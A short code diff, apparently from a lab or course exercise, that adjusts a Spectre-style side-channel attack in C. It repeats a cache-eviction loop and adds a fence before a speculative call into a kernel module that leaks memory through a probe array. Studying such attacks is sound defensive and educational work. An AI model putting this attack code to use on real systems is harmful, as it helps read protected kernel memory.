@@ -74,8 +74,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
             //Add extra evict
             volatile int sink = 0;
-            for (int e = 0; e < EVICT_SIZE; e += 64) {
-                sink += evict_buf[e];
+            for (int pass = 0; pass < 2; pass++) {
+                for (int e = 0; e < EVICT_SIZE; e += 64) {
+                    sink += evict_buf[e];
+                }
             }
 
             // 2. FLUSH probe array
@@ -84,6 +86,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
 
             mfence();
+            lfence();
 
             // 3. SPECULATIVE call
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
